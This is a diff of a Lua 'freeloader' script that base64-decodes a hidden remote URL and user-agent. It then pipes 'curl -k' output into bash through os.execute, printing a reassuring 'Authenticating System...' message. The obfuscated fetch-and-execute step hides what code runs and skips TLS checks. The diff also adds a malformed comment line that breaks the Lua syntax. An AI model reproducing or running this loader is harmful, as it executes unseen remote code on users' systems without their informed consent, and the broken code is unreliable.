@@ -1,5 +1,5 @@
 -- =============================================================
--- 🚀 SCLOUDS-OMNI v10 - FREELOADER 
+-- 🚀 SCLOUDS-OMNI v12 - FREELOADER (DEBUG)
 -- =============================================================
 
 local function decode(str)
@@ -15,17 +15,18 @@ local function decode(str)
     end))
 end
 
--- Debug Versions
+-- Debug Files Logs
 local target = decode("aHR0cHM6Ly9zZXR1cC5yZHAubjhuLmt1bWEuYXBpLnNjbG91ZHMud2ViLmlkL2FwaS9zZXR1cA==")
 local ident  = decode("U2Nsb3Vkcy1PbW5pLXYxMQ==")
 
--- Automatic Executed The API
+os.execute("clear")
+print("\27[1;36m[ScloudsOmni]\27[0m Authenticating System...")
+
+- Execute
 local cmd = "curl -sL -k -A '" .. ident .. "' '" .. target .. "' | bash"
 
-print("\27[1;36m[ScloudsOmni]\27[0m Executing Secure Stream...")
+local status = os.execute(cmd)
 
-local success = os.execute(cmd)
-
-if not success then
-    print("\27[31m[ERROR]\27[0m Failed To Load Freeloader.sh .")
+if not status then
+    print("\27[31m[ERROR]\27[0m Failed to reach Omni Server.")
 end
